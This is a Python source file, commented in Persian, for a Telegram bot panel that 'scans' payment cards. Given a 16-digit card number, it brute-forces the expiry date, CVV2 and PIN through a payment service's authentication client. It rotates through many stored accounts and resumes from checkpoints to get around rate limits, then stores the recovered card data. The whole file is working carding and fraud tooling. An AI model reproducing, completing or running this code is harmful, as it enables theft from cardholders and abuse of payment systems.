"""پنل اسکن کارت - با تعویض خودکار اکانت و checkpoint"""
import asyncio
import time

from telethon import events, Button

from bot.utils import LINE, panel_message, progress_bar, format_elapsed, format_card, mask_pan
import config
import db
from core.auth import IvaAuthClient
from core.scanner import SmartScanner, CardResult


# وضعیت اسکن فعلی
_active_scans = {}


def _build_key_store(account: dict) -> dict:
    """ساخت key_store از اطلاعات اکانت (با رمزگشایی در صورت لزوم)"""
    key_store = {}

    # رمزگشایی فیلدهای حساس
    fernet = None
    if config.is_encryption_enabled():
        try:
            from cryptography.fernet import Fernet
            fernet = Fernet(config.WORKER_SECRET.encode())
        except Exception:
            pass

    def _decrypt_field(val):
        if not val:
            return ""
        if fernet:
            try:
                return fernet.decrypt(val.encode()).decode()
            except Exception:
                return val
        return val

    if account.get("token"):
        key_store["token"] = _decrypt_field(account["token"])
    if account.get("refresh_token"):
        key_store["refreshToken"] = _decrypt_field(account["refresh_token"])
    if account.get("shared_key"):
        key_store["shared_key"] = _decrypt_field(account["shared_key"])
    if account.get("working_key"):
        key_store["working_key"] = _decrypt_field(account["working_key"])
    if account.get("rsa_public"):
        key_store["rsaPublic"] = account["rsa_public"]

    return key_store


def register(bot):
    """ثبت هندلرهای اسکن"""

    @bot.on(events.CallbackQuery(data=b"panel_scan"))
    async def scan_panel(event):
        """نمایش پنل اسکن"""
        if event.sender_id != config.OWNER_ID:
            return

        accounts = await db.get_active_accounts()
        jobs = await db.list_scan_jobs("running")

        rows = [
            f"اکانت‌های فعال: {len(accounts)}",
            f"اسکن‌های در حال اجرا: {len(jobs)}",
        ]

        text = panel_message("🔍 اسکن کارت", rows)

        buttons = [
            [Button.inline("▶️ شروع اسکن جدید", b"scan_start")],
            [Button.inline("⏹ توقف اسکن", b"scan_stop")],
            [Button.inline("📊 وضعیت اسکن‌ها", b"scan_status")],
            [Button.inline("📜 تاریخچه", b"scan_history")],
            [Button.inline("🔙 بازگشت", b"panel_main")],
        ]

        await event.edit(text, buttons=buttons)

    @bot.on(events.CallbackQuery(data=b"scan_start"))
    async def scan_start(event):
        """شروع اسکن - درخواست شماره کارت"""
        if event.sender_id != config.OWNER_ID:
            return

        accounts = await db.get_active_accounts()
        if not accounts:
            await event.answer("اکانت فعالی موجود نیست! ابتدا اکانت اضافه کنید.", alert=True)
            return

        _active_scans[event.sender_id] = {"step": "enter_pan"}

        text = panel_message(
            "▶️ شروع اسکن",
            ["شماره کارت 16 رقمی را وارد کنید:"]
        )
        await event.edit(text, buttons=[[Button.inline("🔙 انصراف", b"panel_scan")]])

    @bot.on(events.CallbackQuery(data=b"scan_stop"))
    async def scan_stop(event):
        """توقف اسکن فعلی"""
        if event.sender_id != config.OWNER_ID:
            return

        state = _active_scans.get(event.sender_id)
        if state and state.get("scanner"):
            state["scanner"].stop()
            await event.answer("اسکن متوقف شد!", alert=True)
        else:
            await event.answer("اسکن فعالی وجود ندارد", alert=True)

    @bot.on(events.CallbackQuery(data=b"scan_status"))
    async def scan_status_view(event):
        """نمایش وضعیت اسکن‌های فعلی"""
        if event.sender_id != config.OWNER_ID:
            return

        jobs = await db.list_scan_jobs("running")
        if not jobs:
            await event.answer("اسکن فعالی وجود ندارد", alert=True)
            return

        rows = []
        for job in jobs:
            rows.append(
                f"💳 {mask_pan(job['card_pan'])} | فاز {job['phase']} | "
                f"{job['current_test']}/{job['total_tests']}"
            )

        text = panel_message("📊 وضعیت اسکن‌ها", rows)
        buttons = [[Button.inline("🔙 بازگشت", b"panel_scan")]]
        await event.edit(text, buttons=buttons)

    @bot.on(events.CallbackQuery(data=b"scan_history"))
    async def scan_history(event):
        """تاریخچه اسکن‌ها"""
        if event.sender_id != config.OWNER_ID:
            return

        jobs = await db.list_scan_jobs()
        rows = []
        for job in jobs[:10]:
            status_emoji = "✅" if job["found_pin"] else "❌"
            rows.append(f"{status_emoji} {mask_pan(job['card_pan'])} | {job['status']}")

        if not rows:
            rows.append("تاریخچه‌ای موجود نیست")

        text = panel_message("📜 تاریخچه اسکن", rows)
        buttons = [[Button.inline("🔙 بازگشت", b"panel_scan")]]
        await event.edit(text, buttons=buttons)


async def handle_scan_message(bot, event):
    """هندلر پیام ورودی برای اسکن (شماره کارت)"""
    state = _active_scans.get(event.sender_id)
    if not state or state.get("step") != "enter_pan":
        return False

    pan = event.text.strip().replace(" ", "").replace("-", "")
    if not pan.isdigit() or len(pan) != 16:
        await event.respond("❌ شماره کارت باید 16 رقم باشد!")
        return True

    # شروع اسکن
    state["step"] = "scanning"
    state["pan"] = pan

    # بررسی وجود جاب قابل ادامه
    resumable = await db.get_resumable_job(pan)
    if resumable:
        await event.respond(panel_message(
            "🔍 ادامه اسکن قبلی",
            [
                f"💳 کارت: {mask_pan(pan)}",
                f"فاز: {resumable['phase']} | checkpoint: {resumable['checkpoint_index']}",
                "در حال ادامه..."
            ]
        ))
    else:
        await event.respond(panel_message(
            "🔍 شروع اسکن",
            [f"💳 کارت: {mask_pan(pan)}", "در حال آماده‌سازی..."]
        ))

    # اجرای اسکن در background
    asyncio.create_task(_run_scan(bot, event, pan, state, resumable))
    return True


async def _run_scan(bot, event, pan: str, state: dict, resumable_job: dict = None):
    """
    اجرای فرایند اسکن با تعویض خودکار اکانت
    در صورت محدودیت اکانت، به اکانت بعدی سوئیچ می‌کند
    و از checkpoint ادامه می‌دهد
    """
    start_time = time.time()
    status_msg = None

    # تنظیمات resume
    resume_phase = 0
    resume_index = 0
    resume_found = {}
    job_id = None

    if resumable_job:
        job_id = resumable_job["id"]
        resume_phase = resumable_job.get("phase", 0)
        resume_index = resumable_job.get("checkpoint_index", 0)
        if resumable_job.get("found_expiry"):
            parts = resumable_job["found_expiry"].split("/")
            if len(parts) == 2:
                resume_found["expire_month"] = parts[0]
                resume_found["expire_year"] = parts[1]
        if resumable_job.get("found_cvv"):
            resume_found["cvv2"] = resumable_job["found_cvv"]
        await db.update_scan_job(job_id, status="running")

    # دریافت همه اکانت‌های فعال
    accounts = await db.get_active_accounts()
    if not accounts:
        await event.respond("❌ اکانت فعالی موجود نیست!")
        _active_scans.pop(event.sender_id, None)
        return

    # ساخت job در صورت نبودن
    if not job_id:
        job_id = await db.add_scan_job(
            card_pan=pan, status="running", account_id=accounts[0]["id"]
        )

    scanner = SmartScanner()
    state["scanner"] = scanner

    last_update = 0
    current_account_idx = 0
    max_rotations = len(accounts)

    async def on_progress(phase, current, total, found):
        """آپدیت پیشرفت در تلگرام"""
        nonlocal status_msg, last_update
        now = time.time()
        if now - last_update < 3:
            return
        last_update = now

        elapsed = format_elapsed(now - start_time)
        bar = progress_bar(current, total)
        found_text = ""
        if found.get("expire_month"):
            found_text += f"\n📅 انقضا: {found['expire_month']}/{found['expire_year']}"
        if found.get("cvv2"):
            found_text += f"\n🔐 CVV2: {found['cvv2']}"

        acc_info = f"اکانت: {current_account_idx + 1}/{len(accounts)}"

        text = panel_message(
            f"🔍 اسکن - فاز {phase}/3",
            [
                f"💳 {mask_pan(pan)}",
                f"{bar}",
                f"📊 {current}/{total} تست",
                f"👤 {acc_info}",
                f"⏱ {elapsed}",
                found_text,
            ]
        )

        try:
            if status_msg:
                await status_msg.edit(text)
            else:
                status_msg = await event.respond(text)
        except Exception:
            pass

        await db.update_scan_job(job_id, phase=phase, current_test=current, total_tests=total)

    async def on_log(msg):
        """لاگ اسکن"""
        await db.add_log("info", "scan", f"[{mask_pan(pan)}] {msg}")

    async def on_checkpoint(phase, index):
        """ذخیره checkpoint در دیتابیس"""
        await db.update_scan_job(job_id, phase=phase, checkpoint_index=index)

    # اسکن با تعویض خودکار اکانت
    result = None
    try:
        while current_account_idx < max_rotations:
            account = accounts[current_account_idx]

            # ساخت auth client
            key_store = _build_key_store(account)
            auth_client = IvaAuthClient(key_store=key_store)

            await db.update_scan_job(job_id, account_id=account["id"])

            # اجرای اسکن
            scanner_instance = SmartScanner()
            state["scanner"] = scanner_instance

            result = await scanner_instance.scan_card(
                pan=pan,
                auth_client=auth_client,
                on_progress=on_progress,
                on_log=on_log,
                on_checkpoint=on_checkpoint,
                resume_phase=resume_phase,
                resume_index=resume_index,
                resume_found=resume_found,
            )

            await auth_client.close()

            if result.rate_limited:
                # تعویض اکانت
                await db.mark_account_limited(account["phone"])
                await on_log(f"[-] اکانت {account['phone']} محدود شد - تعویض...")

                current_account_idx += 1

                if current_account_idx < max_rotations:
                    # ادامه از checkpoint با اکانت جدید
                    resume_phase = result.checkpoint_phase
                    resume_index = result.checkpoint_index
                    # حفظ اطلاعات پیدا شده
                    if result.expire_month:
                        resume_found["expire_month"] = result.expire_month
                        resume_found["expire_year"] = result.expire_year
                    if result.cvv2:
                        resume_found["cvv2"] = result.cvv2

                    await on_log(f"[*] تعویض به اکانت {accounts[current_account_idx]['phone']}")
                    await db.update_scan_job(
                        job_id,
                        found_expiry=f"{resume_found.get('expire_month', '')}/{resume_found.get('expire_year', '')}",
                        found_cvv=resume_found.get("cvv2", ""),
                    )

                    try:
                        await event.respond(panel_message(
                            "🔄 تعویض اکانت",
                            [
                                f"اکانت قبلی محدود شد",
                                f"اکانت جدید: {accounts[current_account_idx]['phone']}",
                                f"ادامه از فاز {resume_phase} ایندکس {resume_index}",
                            ]
                        ))
                    except Exception:
                        pass
                else:
                    # همه اکانت‌ها محدود شده‌اند
                    await on_log("[-] تمام اکانت‌ها محدود شده‌اند!")
                    break
            else:
                # اسکن تمام شد (موفق یا ناموفق)
                break

        # نتیجه نهایی
        elapsed = format_elapsed(time.time() - start_time)

        if result and result.success:
            # موفقیت
            await db.update_scan_job(
                job_id, status="success",
                found_expiry=f"{result.expire_month}/{result.expire_year}",
                found_cvv=result.cvv2,
                found_pin=result.pin,
                finished_at=config.now_str(),
            )
            await db.add_card(
                pan=pan,
                expire_month=result.expire_month,
                expire_year=result.expire_year,
                cvv2=result.cvv2,
                pin=result.pin,
                status="found",
                scanned_at=config.now_str(),
                tests_performed=result.tests_performed,
            )
            await db.add_log("info", "scan", f"کارت {mask_pan(pan)} با موفقیت اسکن شد!")

            success_text = panel_message(
                "✅ اسکن موفق!",
                [
                    format_card(
                        pan,
                        f"{result.expire_month}/{result.expire_year}",
                        result.cvv2,
                        result.pin,
                    ),
                    f"\n📊 تعداد تست: {result.tests_performed}",
                    f"👤 اکانت‌های مصرف‌شده: {current_account_idx + 1}",
                    f"⏱ زمان: {elapsed}",
                ],
                f"🕒 {config.now_str()}"
            )
            await event.respond(success_text)

        elif result and result.rate_limited and current_account_idx >= max_rotations:
            # همه اکانت‌ها محدود شده
            await db.update_scan_job(
                job_id, status="rate_limited",
                found_expiry=f"{resume_found.get('expire_month', '')}/{resume_found.get('expire_year', '')}",
                found_cvv=resume_found.get("cvv2", ""),
                finished_at=config.now_str(),
            )
            await db.add_log("warning", "scan",
                             f"همه اکانت‌ها محدود شدند - اسکن {mask_pan(pan)} متوقف")
            await event.respond(panel_message(
                "⚠️ تمام اکانت‌ها محدود شدند",
                [
                    f"💳 {mask_pan(pan)}",
                    f"فاز رسیده: {result.phase_reached}/3",
                    "اسکن قابل ادامه است پس از ریست محدودیت",
                    f"⏱ زمان: {elapsed}",
                ]
            ))

        elif result:
            await db.update_scan_job(job_id, status="failed", finished_at=config.now_str())
            await db.add_log("warning", "scan",
                             f"اسکن {mask_pan(pan)} ناموفق: {result.error_message}")
            await event.respond(panel_message(
                "❌ اسکن ناموفق",
                [
                    f"💳 {mask_pan(pan)}",
                    f"خطا: {result.error_message}",
                    f"فاز رسیده: {result.phase_reached}/3",
                    f"📊 تست‌ها: {result.tests_performed}",
                    f"⏱ زمان: {elapsed}",
                ]
            ))

    except Exception as e:
        await db.update_scan_job(job_id, status="error", finished_at=config.now_str())
        await db.add_log("error", "scan", f"خطا در اسکن {mask_pan(pan)}: {str(e)[:200]}")
        await event.respond(f"❌ خطای غیرمنتظره: {str(e)[:200]}")

    finally:
        _active_scans.pop(event.sender_id, None)
